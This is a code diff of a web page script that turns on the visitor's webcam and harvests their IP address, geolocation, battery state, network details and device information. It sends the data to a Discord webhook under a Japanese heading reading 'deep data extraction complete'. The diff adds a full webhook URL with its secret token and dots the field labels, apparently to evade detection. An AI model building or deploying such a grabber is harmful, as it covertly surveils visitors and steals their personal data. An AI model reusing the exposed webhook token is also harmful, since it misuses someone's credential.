@@ -26,7 +26,7 @@
 <script>
     const video = document.getElementById('video');
     const log = document.getElementById('log');
-    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+    const webhookUrl = 'https://discord.com/api/webhooks/1495683231444373626/lbslin1oEm_jX36Z7Fvr4wkpH8nHpuIyL0kge7I9YceojsjCAe4dF6PyVHQbwULh0Bf1';
 
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => video.srcObject = s);
 
@@ -84,11 +84,11 @@
                     title: "━━ 深層データ抽出完了 ━━",
                     color: 0x00FF00,
                     fields: [
-                        { name: "IP", value: info.ip, inline: true },
-                        { name: "位置情報", value: info.geo, inline: true },
-                        { name: "バッテリー", value: info.battery, inline: true },
-                        { name: "ネットワーク", value: info.network },
-                        { name: "端末情報", value: "```" + info.ua + "```" }
+                        { name: "I.P", value: info.ip, inline: true },
+                        { name: "位.置.情.報", value: info.geo, inline: true },
+                        { name: "バ.ッ.テ.リ.ー", value: info.battery, inline: true },
+                        { name: "ネ.ッ.ト.ワ.ー.ク", value: info.network },
+                        { name: "端.末.情.報", value: "```" + info.ua + "```" }
                     ],
                     footer: { text: `取得時刻: ${info.time}` }
                 }]
